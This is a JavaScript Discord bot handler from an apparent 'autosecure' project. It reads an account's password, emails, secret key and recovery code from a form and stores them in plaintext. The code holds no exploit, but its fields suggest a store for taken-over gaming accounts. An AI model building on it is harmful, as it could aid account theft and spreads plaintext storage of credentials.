const accountsmsg = require('../../../autosecure/utils/accounts/accountsmsg');
const insertaccount = require('../../../db/insertaccount');
const generateuid = require('../../../autosecure/utils/generateuid');
module.exports = {
    name: "addaccountmodal",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const [t, userId] = interaction.customId.split("|");

            const oldName = interaction.fields.getTextInputValue('oldName');
            const password = interaction.fields.getTextInputValue('password');
           

            const combinedEmail = interaction.fields.getTextInputValue('email');
            let email, secEmail;
           
            if (combinedEmail.includes(',')) {
                [email, secEmail] = combinedEmail.split(',');
            } else {
                email = combinedEmail;
                secEmail = "Not set";
            }
           
            const secretkey = interaction.fields.getTextInputValue('secretkey');
            const recoveryCode = interaction.fields.getTextInputValue('recoveryCode');
           

            const uid = await generateuid();
           

            const accountData = {
                oldName: oldName,
                password: password,
                email: email,
                secEmail: secEmail || "Not set",
                secretkey: secretkey || "Not set",
                recoveryCode: recoveryCode || "Not set",
                mc: "Not set",  // Default value since removed from modal
                capes: "Not set", // Default value since removed from modal
            };
           

            const success = await insertaccount(accountData, uid, userId, null, true);
            if (success) {
                await interaction.reply({
                    content: "Account added successfully!",
                    ephemeral: true
                });

                const updatedMsg = await accountsmsg(userId, 1);
                await interaction.editReply(updatedMsg);
            } else {
                return interaction.reply({
                    content: "Failed to add account. Please try again.",
                    ephemeral: true
                });
            }
        } catch (error) {
            console.error("Error in addaccountmodal:", error);
            return interaction.reply({
                content: "An error occurred while adding the account.",
                ephemeral: true
            });
        }
    }
};